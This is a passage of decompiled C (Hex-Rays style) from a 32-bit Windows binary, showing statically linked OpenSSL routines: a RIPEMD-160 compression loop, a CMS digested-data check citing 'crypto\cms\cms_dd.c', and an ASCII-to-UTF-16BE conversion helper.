  int v505; // [esp+28h] [ebp-54h]
  int v506; // [esp+2Ch] [ebp-50h]
  int v507; // [esp+30h] [ebp-4Ch]
  int v508; // [esp+34h] [ebp-48h]
  int v509; // [esp+38h] [ebp-44h]
  int v510; // [esp+3Ch] [ebp-40h]
  int v511; // [esp+40h] [ebp-3Ch]
  int v512; // [esp+44h] [ebp-38h]
  int v513; // [esp+48h] [ebp-34h]
  int v514; // [esp+4Ch] [ebp-30h]
  int v515; // [esp+50h] [ebp-2Ch]

  v3 = a1;
  v4 = a2;
  v5 = *a1;
  v6 = a1[1];
  v7 = a1[2];
  while ( 1 )
  {
    v495 = *v4;
    v496 = v4[1];
    v497 = v4[2];
    v498 = v4[3];
    v499 = v4[4];
    v500 = v4[5];
    v501 = v4[6];
    v502 = v4[7];
    v503 = v4[8];
    v504 = v4[9];
    v505 = v4[10];
    v506 = v4[11];
    v507 = v4[12];
    v508 = v4[13];
    v509 = v4[14];
    v510 = v4[15];
    v8 = v3[3];
    v9 = v3[4];
    v10 = v6 ^ v8 ^ v7;
    v11 = __ROL4__(v7, 10);
    v12 = v9 + __ROL4__(v10 + v495 + v5, 11);
    v13 = (v12 ^ v11 ^ v6) + v9;
    v14 = __ROL4__(v6, 10);
    v15 = v8 + __ROL4__(v496 + v13, 14);
    v16 = v15 ^ v14 ^ v12;
    v17 = __ROL4__(v12, 10);
    v18 = v11 + __ROL4__(v16 + v497 + v8, 15);
    v19 = (v18 ^ v17 ^ v15) + v11;
    v20 = __ROL4__(v15, 10);
    v21 = v14 + __ROL4__(v498 + v19, 12);
    v22 = v21 ^ v20 ^ v18;
    v23 = __ROL4__(v18, 10);
    v24 = v17 + __ROL4__(v22 + v499 + v14, 5);
    v25 = (v24 ^ v23 ^ v21) + v17;
    v26 = __ROL4__(v21, 10);
    v27 = v20 + __ROL4__(v500 + v25, 8);
    v28 = v27 ^ v26 ^ v24;
    v29 = __ROL4__(v24, 10);
    v30 = v23 + __ROL4__(v28 + v501 + v20, 7);
    v31 = (v30 ^ v29 ^ v27) + v23;
    v32 = __ROL4__(v27, 10);
    v33 = v26 + __ROL4__(v502 + v31, 9);
    v34 = v33 ^ v32 ^ v30;
    v35 = __ROL4__(v30, 10);
    v36 = v29 + __ROL4__(v34 + v503 + v26, 11);
    v37 = (v36 ^ v35 ^ v33) + v29;
    v38 = __ROL4__(v33, 10);
    v39 = v32 + __ROL4__(v504 + v37, 13);
    v40 = v39 ^ v38 ^ v36;
    v41 = __ROL4__(v36, 10);
    v42 = v35 + __ROL4__(v40 + v505 + v32, 14);
    v43 = (v42 ^ v41 ^ v39) + v35;
    v44 = __ROL4__(v39, 10);
    v45 = v38 + __ROL4__(v506 + v43, 15);
    v46 = v45 ^ v44 ^ v42;
    v47 = __ROL4__(v42, 10);
    v48 = v41 + __ROL4__(v46 + v507 + v38, 6);
    v49 = (v48 ^ v47 ^ v45) + v41;
    v50 = __ROL4__(v45, 10);
    v51 = v44 + __ROL4__(v508 + v49, 7);
    v52 = v51 ^ v50 ^ v48;
    v53 = __ROL4__(v48, 10);
    v54 = v47 + __ROL4__(v52 + v509 + v44, 9);
    v55 = (v54 ^ v53 ^ v51) + v47;
    v56 = __ROL4__(v51, 10);
    v57 = v50 + __ROL4__(v510 + v55, 8);
    v58 = v56 & (-1 - v57) | v57 & v54;
    v59 = __ROL4__(v54, 10);
    v60 = v53 + __ROL4__(v502 + v50 + v58 + 1518500249, 7);
    v61 = v59 & (-1 - v60) | v60 & v57;
    v62 = __ROL4__(v57, 10);
    v63 = v56 + __ROL4__(v499 + v53 + v61 + 1518500249, 6);
    v64 = v62 & (-1 - v63) | v63 & v60;
    v65 = __ROL4__(v60, 10);
    v66 = v59 + __ROL4__(v508 + v56 + v64 + 1518500249, 8);
    v67 = v65 & (-1 - v66) | v66 & v63;
    v68 = __ROL4__(v63, 10);
    v69 = v62 + __ROL4__(v496 + v59 + v67 + 1518500249, 13);
    v70 = v68 & (-1 - v69) | v69 & v66;
    v71 = __ROL4__(v66, 10);
    v72 = v65 + __ROL4__(v505 + v62 + v70 + 1518500249, 11);
    v73 = v71 & (-1 - v72) | v72 & v69;
    v74 = __ROL4__(v69, 10);
    v75 = v68 + __ROL4__(v501 + v65 + v73 + 1518500249, 9);
    v76 = v74 & (-1 - v75) | v75 & v72;
    v77 = __ROL4__(v72, 10);
    v78 = v71 + __ROL4__(v510 + v68 + v76 + 1518500249, 7);
    v79 = v77 & (-1 - v78) | v78 & v75;
    v80 = __ROL4__(v75, 10);
    v81 = v74 + __ROL4__(v498 + v71 + v79 + 1518500249, 15);
    v82 = v80 & (-1 - v81) | v81 & v78;
    v83 = __ROL4__(v78, 10);
    v84 = v77 + __ROL4__(v507 + v74 + v82 + 1518500249, 7);
    v85 = v83 & (-1 - v84) | v84 & v81;
    v86 = __ROL4__(v81, 10);
    v87 = v80 + __ROL4__(v495 + v77 + v85 + 1518500249, 12);
    v88 = v86 & (-1 - v87) | v87 & v84;
    v89 = __ROL4__(v84, 10);
    v90 = v83 + __ROL4__(v504 + v80 + v88 + 1518500249, 15);
    v91 = v89 & (-1 - v90) | v90 & v87;
    v92 = __ROL4__(v87, 10);
    v93 = v86 + __ROL4__(v500 + v83 + v91 + 1518500249, 9);
    v94 = v92 & (-1 - v93) | v93 & v90;
    v95 = __ROL4__(v90, 10);
    v96 = v89 + __ROL4__(v497 + v86 + v94 + 1518500249, 11);
    v97 = v95 & (-1 - v96) | v96 & v93;
    v98 = __ROL4__(v93, 10);
    v99 = v92 + __ROL4__(v509 + v89 + v97 + 1518500249, 7);
    v100 = v98 & (-1 - v99) | v99 & v96;
    v101 = __ROL4__(v96, 10);
    v102 = v95 + __ROL4__(v506 + v92 + v100 + 1518500249, 13);
    v103 = v101 & (-1 - v102) | v102 & v99;
    v104 = __ROL4__(v99, 10);
    v105 = v98 + __ROL4__(v503 + v95 + v103 + 1518500249, 12);
    v106 = v104 ^ (v105 | (-1 - v102));
    v107 = __ROL4__(v102, 10);
    v108 = v101 + __ROL4__(v498 + v98 + v106 + 1859775393, 11);
    v109 = v107 ^ (v108 | (-1 - v105));
    v110 = __ROL4__(v105, 10);
    v111 = v104 + __ROL4__(v505 + v101 + v109 + 1859775393, 13);
    v112 = v110 ^ (v111 | (-1 - v108));
    v113 = __ROL4__(v108, 10);
    v114 = v107 + __ROL4__(v509 + v104 + v112 + 1859775393, 6);
    v115 = v113 ^ (v114 | (-1 - v111));
    v116 = __ROL4__(v111, 10);
    v117 = v110 + __ROL4__(v499 + v107 + v115 + 1859775393, 7);
    v118 = v116 ^ (v117 | (-1 - v114));
    v119 = __ROL4__(v114, 10);
    v120 = v113 + __ROL4__(v504 + v110 + v118 + 1859775393, 14);
    v121 = v119 ^ (v120 | (-1 - v117));
    v122 = __ROL4__(v117, 10);
    v123 = v116 + __ROL4__(v510 + v113 + v121 + 1859775393, 9);
    v124 = v122 ^ (v123 | (-1 - v120));
    v125 = __ROL4__(v120, 10);
    v126 = v119 + __ROL4__(v503 + v116 + v124 + 1859775393, 13);
    v127 = v125 ^ (v126 | (-1 - v123));
    v128 = __ROL4__(v123, 10);
    v129 = v122 + __ROL4__(v496 + v119 + v127 + 1859775393, 15);
    v130 = v128 ^ (v129 | (-1 - v126));
    v131 = __ROL4__(v126, 10);
    v132 = v125 + __ROL4__(v497 + v122 + v130 + 1859775393, 14);
    v133 = v131 ^ (v132 | (-1 - v129));
    v134 = __ROL4__(v129, 10);
    v135 = v128 + __ROL4__(v502 + v125 + v133 + 1859775393, 8);
    v136 = v134 ^ (v135 | (-1 - v132));
    v137 = __ROL4__(v132, 10);
    v138 = v131 + __ROL4__(v495 + v128 + v136 + 1859775393, 13);
    v139 = v137 ^ (v138 | (-1 - v135));
    v140 = __ROL4__(v135, 10);
    v141 = v134 + __ROL4__(v501 + v131 + v139 + 1859775393, 6);
    v142 = v140 ^ (v141 | (-1 - v138));
    v143 = __ROL4__(v138, 10);
    v144 = v137 + __ROL4__(v508 + v134 + v142 + 1859775393, 5);
    v145 = v143 ^ (v144 | (-1 - v141));
    v146 = __ROL4__(v141, 10);
    v147 = v140 + __ROL4__(v506 + v137 + v145 + 1859775393, 12);
    v148 = v146 ^ (v147 | (-1 - v144));
    v149 = __ROL4__(v144, 10);
    v150 = v143 + __ROL4__(v500 + v140 + v148 + 1859775393, 7);
    v151 = v149 ^ (v150 | (-1 - v147));
    v152 = __ROL4__(v147, 10);
    v153 = v146 + __ROL4__(v507 + v143 + v151 + 1859775393, 5);
    v154 = v153 & v152 | v150 & (-1 - v152);
    v155 = __ROL4__(v150, 10);
    v156 = v149 + __ROL4__(v496 + v146 + v154 - 1894007588, 11);
    v157 = v156 & v155 | v153 & (-1 - v155);
    v158 = __ROL4__(v153, 10);
    v159 = v152 + __ROL4__(v504 + v149 + v157 - 1894007588, 12);
    v160 = v159 & v158 | v156 & (-1 - v158);
    v161 = __ROL4__(v156, 10);
    v162 = v155 + __ROL4__(v506 + v152 + v160 - 1894007588, 14);
    v163 = v162 & v161 | v159 & (-1 - v161);
    v164 = __ROL4__(v159, 10);
    v165 = v158 + __ROL4__(v505 + v155 + v163 - 1894007588, 15);
    v166 = v165 & v164 | v162 & (-1 - v164);
    v167 = __ROL4__(v162, 10);
    v168 = v161 + __ROL4__(v495 + v158 + v166 - 1894007588, 14);
    v169 = v168 & v167 | v165 & (-1 - v167);
    v170 = __ROL4__(v165, 10);
    v171 = v164 + __ROL4__(v503 + v161 + v169 - 1894007588, 15);
    v172 = v171 & v170 | v168 & (-1 - v170);
    v173 = __ROL4__(v168, 10);
    v174 = v167 + __ROL4__(v507 + v164 + v172 - 1894007588, 9);
    v175 = v174 & v173 | v171 & (-1 - v173);
    v176 = __ROL4__(v171, 10);
    v177 = v170 + __ROL4__(v499 + v167 + v175 - 1894007588, 8);
    v178 = v177 & v176 | v174 & (-1 - v176);
    v179 = __ROL4__(v174, 10);
    v180 = v173 + __ROL4__(v508 + v170 + v178 - 1894007588, 9);
    v181 = v180 & v179 | v177 & (-1 - v179);
    v182 = __ROL4__(v177, 10);
    v183 = v176 + __ROL4__(v498 + v173 + v181 - 1894007588, 14);
    v184 = v183 & v182 | v180 & (-1 - v182);
    v185 = __ROL4__(v180, 10);
    v186 = v179 + __ROL4__(v502 + v176 + v184 - 1894007588, 5);
    v187 = v186 & v185 | v183 & (-1 - v185);
    v188 = __ROL4__(v183, 10);
    v189 = v182 + __ROL4__(v510 + v179 + v187 - 1894007588, 6);
    v190 = v189 & v188 | v186 & (-1 - v188);
    v191 = __ROL4__(v186, 10);
    v192 = v185 + __ROL4__(v509 + v182 + v190 - 1894007588, 8);
    v193 = v192 & v191 | v189 & (-1 - v191);
    v194 = __ROL4__(v189, 10);
    v195 = v188 + __ROL4__(v500 + v185 + v193 - 1894007588, 6);
    v196 = v195 & v194 | v192 & (-1 - v194);
    v197 = __ROL4__(v192, 10);
    v198 = v191 + __ROL4__(v501 + v188 + v196 - 1894007588, 5);
    v199 = v198 & v197 | v195 & (-1 - v197);
    v200 = __ROL4__(v195, 10);
    v201 = v194 + __ROL4__(v497 + v191 + v199 - 1894007588, 12);
    v202 = v201 ^ (v198 | (-1 - v200));
    v203 = __ROL4__(v198, 10);
    v204 = v197 + __ROL4__(v499 + v194 + v202 - 1454113458, 9);
    v205 = v204 ^ (v201 | (-1 - v203));
    v206 = __ROL4__(v201, 10);
    v207 = v200 + __ROL4__(v495 + v197 + v205 - 1454113458, 15);
    v208 = v207 ^ (v204 | (-1 - v206));
    v209 = __ROL4__(v204, 10);
    v210 = v203 + __ROL4__(v500 + v200 + v208 - 1454113458, 5);
    v211 = v210 ^ (v207 | (-1 - v209));
    v212 = __ROL4__(v207, 10);
    v213 = v206 + __ROL4__(v504 + v203 + v211 - 1454113458, 11);
    v214 = v213 ^ (v210 | (-1 - v212));
    v215 = __ROL4__(v210, 10);
    v216 = v209 + __ROL4__(v502 + v206 + v214 - 1454113458, 6);
    v217 = v216 ^ (v213 | (-1 - v215));
    v218 = __ROL4__(v213, 10);
    v219 = v212 + __ROL4__(v507 + v209 + v217 - 1454113458, 8);
    v220 = v219 ^ (v216 | (-1 - v218));
    v221 = __ROL4__(v216, 10);
    v222 = v215 + __ROL4__(v497 + v212 + v220 - 1454113458, 13);
    v223 = v222 ^ (v219 | (-1 - v221));
    v224 = __ROL4__(v219, 10);
    v225 = v218 + __ROL4__(v505 + v215 + v223 - 1454113458, 12);
    v226 = v225 ^ (v222 | (-1 - v224));
    v227 = __ROL4__(v222, 10);
    v228 = v221 + __ROL4__(v509 + v218 + v226 - 1454113458, 5);
    v229 = v228 ^ (v225 | (-1 - v227));
    v230 = __ROL4__(v225, 10);
    v231 = v224 + __ROL4__(v496 + v221 + v229 - 1454113458, 12);
    v232 = v231 ^ (v228 | (-1 - v230));
    v233 = __ROL4__(v228, 10);
    v234 = v227 + __ROL4__(v498 + v224 + v232 - 1454113458, 13);
    v235 = v234 ^ (v231 | (-1 - v233));
    v236 = __ROL4__(v231, 10);
    v237 = v230 + __ROL4__(v503 + v227 + v235 - 1454113458, 14);
    v238 = v237 ^ (v234 | (-1 - v236));
    v239 = __ROL4__(v234, 10);
    v240 = v233 + __ROL4__(v506 + v230 + v238 - 1454113458, 11);
    v241 = v240 ^ (v237 | (-1 - v239));
    v242 = __ROL4__(v237, 10);
    v243 = v236 + __ROL4__(v501 + v233 + v241 - 1454113458, 8);
    v244 = v243 ^ (v240 | (-1 - v242));
    v245 = __ROL4__(v240, 10);
    v246 = v239 + __ROL4__(v510 + v236 + v244 - 1454113458, 5);
    v511 = v242;
    v512 = v242 + __ROL4__(v508 + v239 + (v246 ^ (v243 | (-1 - v245))) - 1454113458, 6);
    v513 = v246;
    v247 = a1[1];
    v514 = __ROL4__(v243, 10);
    v248 = a1[2];
    v515 = v245;
    v249 = a1[3];
    v250 = a1[4];
    v251 = v247 ^ (v248 | (-1 - v249));
    v252 = __ROL4__(v248, 10);
    v253 = v250 + __ROL4__(v500 + *a1 + v251 + 1352829926, 8);
    v254 = v253 ^ (v247 | (-1 - v252));
    v255 = __ROL4__(v247, 10);
    v256 = v249 + __ROL4__(v509 + v250 + v254 + 1352829926, 9);
    v257 = v256 ^ (v253 | (-1 - v255));
    v258 = __ROL4__(v253, 10);
    v259 = v252 + __ROL4__(v502 + v249 + v257 + 1352829926, 9);
    v260 = v259 ^ (v256 | (-1 - v258));
    v261 = __ROL4__(v256, 10);
    v262 = v255 + __ROL4__(v495 + v252 + v260 + 1352829926, 11);
    v263 = v262 ^ (v259 | (-1 - v261));
    v264 = __ROL4__(v259, 10);
    v265 = v258 + __ROL4__(v504 + v255 + v263 + 1352829926, 13);
    v266 = v265 ^ (v262 | (-1 - v264));
    v267 = __ROL4__(v262, 10);
    v268 = v261 + __ROL4__(v497 + v258 + v266 + 1352829926, 15);
    v269 = v268 ^ (v265 | (-1 - v267));
    v270 = __ROL4__(v265, 10);
    v271 = v264 + __ROL4__(v506 + v261 + v269 + 1352829926, 15);
    v272 = v271 ^ (v268 | (-1 - v270));
    v273 = __ROL4__(v268, 10);
    v274 = v267 + __ROL4__(v499 + v264 + v272 + 1352829926, 5);
    v275 = v274 ^ (v271 | (-1 - v273));
    v276 = __ROL4__(v271, 10);
    v277 = v270 + __ROL4__(v508 + v267 + v275 + 1352829926, 7);
    v278 = v277 ^ (v274 | (-1 - v276));
    v279 = __ROL4__(v274, 10);
    v280 = v273 + __ROL4__(v501 + v270 + v278 + 1352829926, 7);
    v281 = v280 ^ (v277 | (-1 - v279));
    v282 = __ROL4__(v277, 10);
    v283 = v276 + __ROL4__(v510 + v273 + v281 + 1352829926, 8);
    v284 = v283 ^ (v280 | (-1 - v282));
    v285 = __ROL4__(v280, 10);
    v286 = v279 + __ROL4__(v503 + v276 + v284 + 1352829926, 11);
    v287 = v286 ^ (v283 | (-1 - v285));
    v288 = __ROL4__(v283, 10);
    v289 = v282 + __ROL4__(v496 + v279 + v287 + 1352829926, 14);
    v290 = v289 ^ (v286 | (-1 - v288));
    v291 = __ROL4__(v286, 10);
    v292 = v285 + __ROL4__(v505 + v282 + v290 + 1352829926, 14);
    v293 = v292 ^ (v289 | (-1 - v291));
    v294 = __ROL4__(v289, 10);
    v295 = v288 + __ROL4__(v498 + v285 + v293 + 1352829926, 12);
    v296 = v295 ^ (v292 | (-1 - v294));
    v297 = __ROL4__(v292, 10);
    v298 = v291 + __ROL4__(v507 + v288 + v296 + 1352829926, 6);
    v299 = v298 & v297 | v295 & (-1 - v297);
    v300 = __ROL4__(v295, 10);
    v301 = v294 + __ROL4__(v501 + v291 + v299 + 1548603684, 9);
    v302 = v301 & v300 | v298 & (-1 - v300);
    v303 = __ROL4__(v298, 10);
    v304 = v297 + __ROL4__(v506 + v294 + v302 + 1548603684, 13);
    v305 = v304 & v303 | v301 & (-1 - v303);
    v306 = __ROL4__(v301, 10);
    v307 = v300 + __ROL4__(v498 + v297 + v305 + 1548603684, 15);
    v308 = v307 & v306 | v304 & (-1 - v306);
    v309 = __ROL4__(v304, 10);
    v310 = v303 + __ROL4__(v502 + v300 + v308 + 1548603684, 7);
    v311 = v310 & v309 | v307 & (-1 - v309);
    v312 = __ROL4__(v307, 10);
    v313 = v306 + __ROL4__(v495 + v303 + v311 + 1548603684, 12);
    v314 = v313 & v312 | v310 & (-1 - v312);
    v315 = __ROL4__(v310, 10);
    v316 = v309 + __ROL4__(v508 + v306 + v314 + 1548603684, 8);
    v317 = v316 & v315 | v313 & (-1 - v315);
    v318 = __ROL4__(v313, 10);
    v319 = v312 + __ROL4__(v500 + v309 + v317 + 1548603684, 9);
    v320 = v319 & v318 | v316 & (-1 - v318);
    v321 = __ROL4__(v316, 10);
    v322 = v315 + __ROL4__(v505 + v312 + v320 + 1548603684, 11);
    v323 = v322 & v321 | v319 & (-1 - v321);
    v324 = __ROL4__(v319, 10);
    v325 = v318 + __ROL4__(v509 + v315 + v323 + 1548603684, 7);
    v326 = v325 & v324 | v322 & (-1 - v324);
    v327 = __ROL4__(v322, 10);
    v328 = v321 + __ROL4__(v510 + v318 + v326 + 1548603684, 7);
    v329 = v328 & v327 | v325 & (-1 - v327);
    v330 = __ROL4__(v325, 10);
    v331 = v324 + __ROL4__(v503 + v321 + v329 + 1548603684, 12);
    v332 = v331 & v330 | v328 & (-1 - v330);
    v333 = __ROL4__(v328, 10);
    v334 = v327 + __ROL4__(v507 + v324 + v332 + 1548603684, 7);
    v335 = v334 & v333 | v331 & (-1 - v333);
    v336 = __ROL4__(v331, 10);
    v337 = v330 + __ROL4__(v499 + v327 + v335 + 1548603684, 6);
    v338 = v337 & v336 | v334 & (-1 - v336);
    v339 = __ROL4__(v334, 10);
    v340 = v333 + __ROL4__(v504 + v330 + v338 + 1548603684, 15);
    v341 = v340 & v339 | v337 & (-1 - v339);
    v342 = __ROL4__(v337, 10);
    v343 = v336 + __ROL4__(v496 + v333 + v341 + 1548603684, 13);
    v344 = v343 & v342 | v340 & (-1 - v342);
    v345 = __ROL4__(v340, 10);
    v346 = v339 + __ROL4__(v497 + v336 + v344 + 1548603684, 11);
    v347 = v345 ^ (v346 | (-1 - v343));
    v348 = __ROL4__(v343, 10);
    v349 = v342 + __ROL4__(v510 + v339 + v347 + 1836072691, 9);
    v350 = v348 ^ (v349 | (-1 - v346));
    v351 = __ROL4__(v346, 10);
    v352 = v345 + __ROL4__(v500 + v342 + v350 + 1836072691, 7);
    v353 = v351 ^ (v352 | (-1 - v349));
    v354 = __ROL4__(v349, 10);
    v355 = v348 + __ROL4__(v496 + v345 + v353 + 1836072691, 15);
    v356 = v354 ^ (v355 | (-1 - v352));
    v357 = __ROL4__(v352, 10);
    v358 = v351 + __ROL4__(v498 + v348 + v356 + 1836072691, 11);
    v359 = v357 ^ (v358 | (-1 - v355));
    v360 = __ROL4__(v355, 10);
    v361 = v354 + __ROL4__(v502 + v351 + v359 + 1836072691, 8);
    v362 = v360 ^ (v361 | (-1 - v358));
    v363 = __ROL4__(v358, 10);
    v364 = v357 + __ROL4__(v509 + v354 + v362 + 1836072691, 6);
    v365 = v363 ^ (v364 | (-1 - v361));
    v366 = __ROL4__(v361, 10);
    v367 = v360 + __ROL4__(v501 + v357 + v365 + 1836072691, 6);
    v368 = v366 ^ (v367 | (-1 - v364));
    v369 = __ROL4__(v364, 10);
    v370 = v363 + __ROL4__(v504 + v360 + v368 + 1836072691, 14);
    v371 = v369 ^ (v370 | (-1 - v367));
    v372 = __ROL4__(v367, 10);
    v373 = v366 + __ROL4__(v506 + v363 + v371 + 1836072691, 12);
    v374 = v372 ^ (v373 | (-1 - v370));
    v375 = __ROL4__(v370, 10);
    v376 = v369 + __ROL4__(v503 + v366 + v374 + 1836072691, 13);
    v377 = v375 ^ (v376 | (-1 - v373));
    v378 = __ROL4__(v373, 10);
    v379 = v372 + __ROL4__(v507 + v369 + v377 + 1836072691, 5);
    v380 = v378 ^ (v379 | (-1 - v376));
    v381 = __ROL4__(v376, 10);
    v382 = v375 + __ROL4__(v497 + v372 + v380 + 1836072691, 14);
    v383 = v381 ^ (v382 | (-1 - v379));
    v384 = __ROL4__(v379, 10);
    v385 = v378 + __ROL4__(v505 + v375 + v383 + 1836072691, 13);
    v386 = v384 ^ (v385 | (-1 - v382));
    v387 = __ROL4__(v382, 10);
    v388 = v381 + __ROL4__(v495 + v378 + v386 + 1836072691, 13);
    v389 = v387 ^ (v388 | (-1 - v385));
    v390 = __ROL4__(v385, 10);
    v391 = v384 + __ROL4__(v499 + v381 + v389 + 1836072691, 7);
    v392 = v390 ^ (v391 | (-1 - v388));
    v393 = __ROL4__(v388, 10);
    v394 = v387 + __ROL4__(v508 + v384 + v392 + 1836072691, 5);
    v395 = v393 & (-1 - v394) | v394 & v391;
    v396 = __ROL4__(v391, 10);
    v397 = v390 + __ROL4__(v503 + v387 + v395 + 2053994217, 15);
    v398 = v396 & (-1 - v397) | v397 & v394;
    v399 = __ROL4__(v394, 10);
    v400 = v393 + __ROL4__(v501 + v390 + v398 + 2053994217, 5);
    v401 = v399 & (-1 - v400) | v400 & v397;
    v402 = __ROL4__(v397, 10);
    v403 = v396 + __ROL4__(v499 + v393 + v401 + 2053994217, 8);
    v404 = v402 & (-1 - v403) | v403 & v400;
    v405 = __ROL4__(v400, 10);
    v406 = v399 + __ROL4__(v496 + v396 + v404 + 2053994217, 11);
    v407 = v405 & (-1 - v406) | v406 & v403;
    v408 = __ROL4__(v403, 10);
    v409 = v402 + __ROL4__(v498 + v399 + v407 + 2053994217, 14);
    v410 = v408 & (-1 - v409) | v409 & v406;
    v411 = __ROL4__(v406, 10);
    v412 = v405 + __ROL4__(v506 + v402 + v410 + 2053994217, 14);
    v413 = v411 & (-1 - v412) | v412 & v409;
    v414 = __ROL4__(v409, 10);
    v415 = v408 + __ROL4__(v510 + v405 + v413 + 2053994217, 6);
    v416 = v414 & (-1 - v415) | v415 & v412;
    v417 = __ROL4__(v412, 10);
    v418 = v411 + __ROL4__(v495 + v408 + v416 + 2053994217, 14);
    v419 = v417 & (-1 - v418) | v418 & v415;
    v420 = __ROL4__(v415, 10);
    v421 = v414 + __ROL4__(v500 + v411 + v419 + 2053994217, 6);
    v422 = v420 & (-1 - v421) | v421 & v418;
    v423 = __ROL4__(v418, 10);
    v424 = v417 + __ROL4__(v507 + v414 + v422 + 2053994217, 9);
    v425 = v423 & (-1 - v424) | v424 & v421;
    v426 = __ROL4__(v421, 10);
    v427 = v420 + __ROL4__(v497 + v417 + v425 + 2053994217, 12);
    v428 = v426 & (-1 - v427) | v427 & v424;
    v429 = __ROL4__(v424, 10);
    v430 = v423 + __ROL4__(v508 + v420 + v428 + 2053994217, 9);
    v431 = v429 & (-1 - v430) | v430 & v427;
    v432 = __ROL4__(v427, 10);
    v433 = v426 + __ROL4__(v504 + v423 + v431 + 2053994217, 12);
    v434 = v432 & (-1 - v433) | v433 & v430;
    v435 = __ROL4__(v430, 10);
    v436 = v429 + __ROL4__(v502 + v426 + v434 + 2053994217, 5);
    v437 = v435 & (-1 - v436) | v436 & v433;
    v438 = __ROL4__(v433, 10);
    v439 = v432 + __ROL4__(v505 + v429 + v437 + 2053994217, 15);
    v440 = v439 & v436 | v438 & (-1 - v439);
    v441 = __ROL4__(v436, 10);
    v442 = v435 + __ROL4__(v509 + v432 + v440 + 2053994217, 8);
    v443 = v442 ^ v441 ^ v439;
    v444 = __ROL4__(v439, 10);
    v445 = v438 + __ROL4__(v443 + v507 + v435, 8);
    v446 = (v445 ^ v444 ^ v442) + v438;
    v447 = __ROL4__(v442, 10);
    v448 = v441 + __ROL4__(v510 + v446, 5);
    v449 = v448 ^ v447 ^ v445;
    v450 = __ROL4__(v445, 10);
    v451 = v444 + __ROL4__(v449 + v505 + v441, 12);
    v452 = (v451 ^ v450 ^ v448) + v444;
    v453 = __ROL4__(v448, 10);
    v454 = v447 + __ROL4__(v499 + v452, 9);
    v455 = v454 ^ v453 ^ v451;
    v456 = __ROL4__(v451, 10);
    v457 = v450 + __ROL4__(v455 + v496 + v447, 12);
    v458 = (v457 ^ v456 ^ v454) + v450;
    v459 = __ROL4__(v454, 10);
    v460 = v453 + __ROL4__(v500 + v458, 5);
    v461 = v460 ^ v459 ^ v457;
    v462 = __ROL4__(v457, 10);
    v463 = v456 + __ROL4__(v461 + v503 + v453, 14);
    v464 = (v463 ^ v462 ^ v460) + v456;
    v465 = __ROL4__(v460, 10);
    v466 = v459 + __ROL4__(v502 + v464, 6);
    v467 = v466 ^ v465 ^ v463;
    v468 = __ROL4__(v463, 10);
    v469 = v462 + __ROL4__(v467 + v501 + v459, 8);
    v470 = (v469 ^ v468 ^ v466) + v462;
    v471 = __ROL4__(v466, 10);
    v472 = v465 + __ROL4__(v497 + v470, 13);
    v473 = v472 ^ v471 ^ v469;
    v474 = __ROL4__(v469, 10);
    v475 = v468 + __ROL4__(v473 + v508 + v465, 6);
    v476 = (v475 ^ v474 ^ v472) + v468;
    v477 = __ROL4__(v472, 10);
    v478 = v471 + __ROL4__(v509 + v476, 5);
    v479 = v478 ^ v477 ^ v475;
    v480 = __ROL4__(v475, 10);
    v481 = v474 + __ROL4__(v479 + v495 + v471, 15);
    v482 = (v481 ^ v480 ^ v478) + v474;
    v483 = __ROL4__(v478, 10);
    v484 = v477 + __ROL4__(v498 + v482, 13);
    v485 = v484 ^ v483 ^ v481;
    v486 = __ROL4__(v481, 10);
    v487 = v480 + __ROL4__(v485 + v504 + v477, 11);
    v3 = a1;
    v488 = v483 + __ROL4__(v506 + (v487 ^ v486 ^ v484) + v480, 11);
    v489 = v513 + a1[1] + __ROL4__(v484, 10);
    v490 = v514 + a1[2] + v486;
    v491 = v515 + a1[3] + v483;
    v492 = v511 + a1[4] + v488;
    v493 = v512 + *a1 + v487;
    *a1 = v489;
    a1[1] = v490;
    a1[2] = v491;
    result = a3 - 1;
    a1[3] = v492;
    a1[4] = v493;
    if ( a3 <= 1 )
      break;
    --a3;
    v7 = v491;
    v5 = v489;
    v4 = a2 + 16;
    v6 = v490;
    a2 += 16;
  }
  return result;
}

//----- (004D61F0) --------------------------------------------------------
volatile LONG *__cdecl sub_4D61F0(int a1)
{
  return sub_4CDF40(*(_DWORD **)(*(_DWORD *)(a1 + 4) + 4));
}

//----- (004D6210) --------------------------------------------------------
int __cdecl sub_4D6210(int a1, int **a2, int a3)
{
  _BYTE **v3; // ebp
  int v4; // ebx
  int v5; // esi
  _DWORD *v6; // ecx
  size_t v7; // eax
  int v8; // ecx
  char *v9; // esi
  size_t Size; // [esp+10h] [ebp-48h] BYREF
  char Src[64]; // [esp+14h] [ebp-44h] BYREF

  v3 = (_BYTE **)sub_42B820();
  v4 = 0;
  if ( !v3 )
  {
    sub_408310(46, 117, 65, (int)"crypto\\cms\\cms_dd.c", 64);
    goto LABEL_20;
  }
  v5 = *(_DWORD *)(a1 + 4);
  if ( sub_4CDFF0((int)v3, a2, *(_DWORD **)(v5 + 4)) && sub_42BA20(v3, (int)Src, &Size) > 0 )
  {
    if ( a3 )
    {
      v6 = *(_DWORD **)(v5 + 12);
      v7 = Size;
      if ( Size != *v6 )
      {
        sub_408310(46, 117, 121, (int)"crypto\\cms\\cms_dd.c", 79);
        goto LABEL_20;
      }
      v8 = v6[2];
      v9 = Src;
      if ( Size >= 4 )
      {
        while ( *(_DWORD *)v9 == *(_DWORD *)v8 )
        {
          v7 -= 4;
          v8 += 4;
          v9 += 4;
          if ( v7 < 4 )
            goto LABEL_11;
        }
        goto LABEL_17;
      }
LABEL_11:
      if ( v7
        && (*(_BYTE *)v8 != *v9 || v7 > 1 && (*(_BYTE *)(v8 + 1) != v9[1] || v7 > 2 && *(_BYTE *)(v8 + 2) != v9[2])) )
      {
LABEL_17:
        sub_408310(46, 117, 158, (int)"crypto\\cms\\cms_dd.c", 85);
        goto LABEL_20;
      }
    }
    else if ( !sub_432910(*(_DWORD *)(v5 + 12), Src, Size) )
    {
      goto LABEL_20;
    }
    v4 = 1;
  }
LABEL_20:
  sub_42B840(v3);
  return v4;
}

//----- (004D6360) --------------------------------------------------------
_BYTE *__cdecl sub_4D6360(const char *a1, unsigned int a2, _DWORD *a3, size_t *a4)
{
  unsigned int v4; // eax
  size_t v5; // edi
  _BYTE *result; // eax
  int i; // ecx

  v4 = a2;
  if ( a2 == -1 )
    v4 = strlen(a1);
  v5 = 2 * v4 + 2;
  result = sub_4133F0(v5);
  if ( result )
  {
    for ( i = 0; i < (int)(v5 - 2); i += 2 )
    {
      result[i] = 0;
      result[i + 1] = a1[i >> 1];
    }
    result[v5 - 2] = 0;
    result[v5 - 1] = 0;
    if ( a4 )
      *a4 = v5;
    if ( a3 )
      *a3 = result;
  }
  return result;
}

